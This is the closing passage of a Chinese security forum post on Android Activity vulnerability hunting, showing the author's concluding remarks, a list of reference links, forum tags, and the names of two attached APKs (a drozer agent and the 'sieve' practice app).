写到这里，这个帖子总算写完了，对 Android 的 Activity 漏洞挖掘的总结过程中，我又再一次将 Android 的 Activity 组件运行的基本原理熟悉了一遍，学习就是不断的总结提高把，可能在编写的过程中，还存在很多不足地方，就请各位大佬指教了。

[](#五、参考网址)五、参考网址
-----------------

```
Android 第一行代码
https://www.jianshu.com/p/b999119d2752
https://blog.csdn.net/zhangxunxyy/article/details/80805394
https://github.com/jaredrummler/AndroidProcesses
https://jaredrummler.com/2017/09/13/android-processes/
https://www.itranslater.com/qa/details/2325835735628252160
https://blog.csdn.net/daydayplayphone/article/details/52236148
https://github.com/Chainfire/libsuperuser
https://blog.csdn.net/brycegao321/article/details/76966424
https://blog.csdn.net/dq1005/article/details/51453121
https://www.jianshu.com/p/f3aea648dfbb
https://blog.csdn.net/weixin_39352694/article/details/83620517
https://github.com/wenmingvs/AndroidProcess
https://blog.csdn.net/ruingman/article/details/51146152
http://blog.chinaunix.net/uid-16728139-id-4962659.html
 http://rui0.cn/archives/30

```

[【公告】 讲师招募 | 全新 “预付费” 模式，不想来试试吗？](https://bbs.pediy.com/thread-271621.htm)

最后于 2021-9-5 21:20 被随风而行 aa 编辑 ，原因：

[#基础理论](forum-161-1-117.htm) [#漏洞相关](forum-161-1-123.htm) [#源码分析](forum-161-1-127.htm)

上传的附件：

*   [drozer-agent-2.3.4.apk](javascript:void(0)) （618.27kb，18 次下载）
*   [sieve.apk](javascript:void(0)) （359.26kb，30 次下载）